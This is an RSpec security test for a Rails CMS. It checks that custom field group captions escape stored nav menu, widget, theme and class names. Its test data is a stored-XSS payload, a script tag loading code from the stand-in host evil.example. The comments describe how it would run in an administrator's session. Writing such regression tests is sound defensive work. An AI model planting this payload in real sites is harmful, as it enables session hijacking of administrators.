# frozen_string_literal: true

require 'rails_helper'

# `CustomFieldGroup#get_caption` builds a caption in the *model* by string interpolation, and
# `admin/settings/custom_fields/index.html.erb` renders it with `raw`. The `the_title` interpolations
# were escaped by #1206, but the plain model attributes it splices in were not, so a user who can
# manage nav menus or widgets can store markup that executes in an administrator's session.
#
# There is no `titleize` in this path, so a payload lands verbatim.
RSpec.describe 'Security: custom field group caption escaping', type: :request do
  init_site

  let(:current_site) { Cama::Site.first.decorate }
  let(:admin) { create(:user, role: 'admin', site: current_site) }
  let(:payload) { '<script src=//evil.example/a.js></script>' }

  before do
    allow_any_instance_of(CamaleonCms::AdminController).to receive(:current_site).and_return(current_site)
    sign_in_as(admin, site: current_site)
  end

  def place_group_on(object_class, objectid, slug)
    current_site.custom_field_groups.create!(
      name: 'Injected Group', slug: slug, object_class: object_class, objectid: objectid
    )
  end

  # The site ships with its own field groups, so pick the row of the injected one: the caption is the
  # fifth column ("display objects"), the group name is the third.
  def caption_cell
    get '/admin/settings/custom_fields'
    row = Nokogiri::HTML5.parse(response.body).css('#table_custom_groups tbody tr').find do |tr|
      tr.css('td:nth-child(3)').text.strip == 'Injected Group'
    end
    row.at_css('td:nth-child(5)')
  end

  def injected_script_sources(node)
    node.css('script[src]').map { |script| script['src'] }.grep(/evil\.example/i)
  end

  it 'escapes an injected nav menu name' do
    menu = current_site.nav_menus.create!(name: payload, slug: 'evil-menu')
    place_group_on('NavMenu', menu.id, '_evil-menu-group')

    cell = caption_cell
    expect(injected_script_sources(cell)).to be_empty
    expect(cell.text).to include(payload)
  end

  it 'escapes an injected widget name' do
    widget = current_site.widgets.create!(name: payload, slug: 'evil-widget')
    place_group_on('Main', widget.id, '_evil-widget-group')

    cell = caption_cell
    expect(injected_script_sources(cell)).to be_empty
    expect(cell.text).to include(payload)
  end

  it 'escapes an injected theme name' do
    theme = current_site.themes.create!(name: payload, slug: 'evil-theme')
    place_group_on('Theme', theme.id, '_evil-theme-group')

    cell = caption_cell
    expect(injected_script_sources(cell)).to be_empty
    expect(cell.text).to include(payload)
  end

  # The default arm interpolates `object_class` itself, and the placement check added by #1217 admits
  # any class name paired with the current site's id -- that arm exists so hook-registered models do
  # not need an allow-list. So the class name is attacker-settable text on the same code path.
  it 'escapes an injected object_class' do
    place_group_on(payload, current_site.id, '_evil-class-group')

    cell = caption_cell
    expect(injected_script_sources(cell)).to be_empty
    expect(cell.text).to include(payload)
  end

  it 'renders a caption for a legitimately named nav menu unchanged' do
    menu = current_site.nav_menus.create!(name: 'Main Menu', slug: 'main-menu')
    group = place_group_on('NavMenu', menu.id, '_main-menu-group')

    expect(group.get_caption).to eq('Field settings for Menus <b>(Main Menu)</b>')
  end
end
